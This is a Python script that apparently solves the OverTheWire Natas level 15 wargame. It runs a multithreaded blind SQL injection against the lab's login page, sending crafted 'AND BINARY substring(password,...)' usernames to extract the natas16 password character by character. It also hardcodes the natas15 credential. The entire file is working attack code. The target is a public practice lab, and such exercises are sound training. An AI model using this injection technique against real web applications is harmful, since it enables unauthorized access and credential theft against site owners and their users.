import threading
from threading import Thread
import requests
from requests.auth import HTTPBasicAuth

auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
filtered = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#filtered = 'W03569acehijmnpqtwBEHINOR'
result = ["","","","","","","","","","","","","","","","" ,"","","","","","","","","","","","","","","",""]
thred = 4	


def task(i,char):
  payload = {'username' : 'natas16" AND BINARY substring(password,'+ str(i+1) + ',1) ="'+char}
  r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=auth, data = payload)
  if 'exists' in r.text :
    result[i] = char           
    

def attack(i):
    threads = []
    for char in filtered:
       t = Thread(target=task, args=(i,char))
       t.start()
       threads.append(t)
    for t in threads:
     t.join() 
     
if __name__ == "__main__":
    
    passwd=""
    for i in range(0,32):
      attack(i)
      passwd+=result[i];
    print(passwd)